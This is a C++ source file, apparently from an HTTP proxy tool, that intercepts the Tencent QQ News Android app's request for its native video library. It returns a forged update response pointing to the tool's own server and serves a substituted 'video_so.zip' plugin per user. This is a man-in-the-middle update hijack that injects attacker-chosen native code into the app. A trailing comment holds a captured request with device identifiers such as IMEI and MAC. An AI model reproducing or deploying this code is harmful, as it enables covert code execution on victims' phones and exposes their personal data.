#include "QQTencentNews.h"
#include <windows.h>
#include "../HttpUtils.h"
#include "../cipher/CryptoUtils.h"
#include "../version.h"
#include "PluginServer.h"

int gQQNewsFlag = 0;

int QQTencentNews::isQQNews(string url, string host) {
	if (strstr(host.c_str(), "r.inews.qq.com") && strstr(url.c_str(),"/getVideoSo?") )
	{
		gQQNewsFlag = 1;
		return TRUE;
	}else if (strstr(host.c_str(), "s.inews.gtimg.com") && strstr(url.c_str(), "/video_so.zip?"))
	{
		gQQNewsFlag = 2;
		return TRUE;
	}
	return FALSE;
}


int QQTencentNews::replyQQNews(char*lpbuffer, int len, int buflimit, LPHTTPPROXYPARAM lphttp) {
	if (gQQNewsFlag == 1)
	{
		//{"filename":"video_so.zip","url":"http:\/\/s.inews.gtimg.com\/inewsapp\/QQNews_android\/videoso\/test\/5.6.27\/5.6.27_2\/video_so.zip",
		//"md5":"1f0760d214cc2dfee5b8f7a3a479b8e2","version":"1.1.2"}
		//Transfer-Encoding chunked\r\n Content-Encoding: gzip\r\n
		char * lpRespFormat = "HTTP/1.1 200 OK\r\nContent-Type: application/json\r\nContent-Length: %u\r\nConnection: keep-alive\r\n\r\n%s";

		char * jsonFormat =
			"{\"filename\":\"%s\",\"url\":\"http:\\/\\/%s\\/%s\",\"md5\":\"%s\",\"version\":\"%s\",\"other\":\"\"}\r\n";		

		int ret = FALSE;

		string fn = "video_so.zip";		//video_so
		string filename = Public::getUserPluginPath(lphttp->username) + fn;
		string szip = HttpUtils::getIPstr(gServerIP) + "\\/" + lphttp->username;

		char szmd5[64] = { 0 };
		unsigned char hexmd5[64];
		ret = CryptoUtils::getUpdateFileMd5(filename, szmd5, hexmd5, TRUE);

		char lpJson[MAX_RESPONSE_HEADER_SIZE];
		int iJsonLen = sprintf_s(lpJson, MAX_RESPONSE_HEADER_SIZE, jsonFormat, fn.c_str(),
			szip.c_str(), fn.c_str(), szmd5, QQNEWS_VIDEO_SO_VERSION);

		int retlen = sprintf_s(lpbuffer, MAX_RESPONSE_HEADER_SIZE, lpRespFormat, iJsonLen, lpJson);

		return retlen;
	}
	else if (gQQNewsFlag == 2)
	{
		char * szHttpRespFormat = "HTTP/1.1 200 OK\r\nConnection: keep-alive\r\nContent-Type: application/octet-stream\r\nContent-Length: %u\r\n\r\n";

		string filename = Public::getUserUrl(lphttp->username, "video_so.zip");

		int ret = PluginServer::SendPluginFile(filename.c_str(), lphttp, szHttpRespFormat, 1);
		return 0;
	}
	return 0;
}



/*
GET /getVideoSo?version=5.6.30&adcode=330108&is_special_device=0&mid=9b79da71f4b6ad98435089174af4f369327990c8&dpi=480.0&is_chinamobile_oem=0&qqnetwork=wifi&rom_type=FlymeFlyme%206.3.0.2Q&real_device_width=2.25&delay_global_info=0|1|1|1|2|4|6|1|0|6|1|1|2|2|0|5|2|0|3|-1|-1|-1|-1|0|3|4|5|1|1|0|&apptype=android&islite=0&hw=Meizu_M571C&global_session_id=1532703452660&screen_width=1080&omgbizid=f0422f14c4b4c94df2d81bb91bfbfd3663d10050212112&sceneid=&imsi=&fix_store=&isoem=0&lite_version=&pagestartfrom=icon&mac=54:14:73:e4:53:92&activefrom=icon&store=203&screen_height=1920&extinfo=&real_device_height=4.0&origin_imei=99000645877398&network_type=wifi&global_info=0|1|1|1|2|4|6|1|0|6|1|1|2|2|0|5|2|0|3|-1|-1|-1|-1|0|3|4|5|1|1|0|&imsi_history=0&Cookie=lskey%3D;skey%3D;uin%3D;%20luin%3D;logintype%3D0;%20main_login%3D;%20&uid=3f80ef4d047b3905&devid=99000645877398&appver=22_android_5.6.30&omgid=080c2351b788154b135890eea022d026344e0010212112&qn-sig=2df5ba4304b0475e8fadc8b2980abc48&qn-rid=5336837b-f174-4466-b53f-9e3368b7884a HTTP/1.1
Cookie: lskey=;skey=;uin=; luin=;logintype=0; main_login=;
Referer: http://inews.qq.com/inews/android/
User-Agent: %E8%85%BE%E8%AE%AF%E6%96%B0%E9%97%BB5630(android)
Host: r.inews.qq.com
Connection: Keep-Alive
Accept-Encoding: gzip

HTTP/1.1 200 OK
Server: openresty
Date: Fri, 27 Jul 2018 14:57:44 GMT
Content-Type: application/json
Transfer-Encoding: chunked
Connection: keep-alive
Keep-Alive: timeout=120
X-Powered-By: HHVM/3.7.3-dev
upzone: core_inews
Content-Encoding: gzip
X-Client-Ip: 112.10.85.73
X-Server-Ip: 182.254.118.8
X-Client-Ip: 112.10.85.73

{"filename":"video_so.zip","url":"http:\/\/s.inews.gtimg.com\/inewsapp\/QQNews_android\/videoso\/test\/5.6.27\/5.6.27_2\/video_so.zip",
"md5":"1f0760d214cc2dfee5b8f7a3a479b8e2","version":"1.1.2"}
*/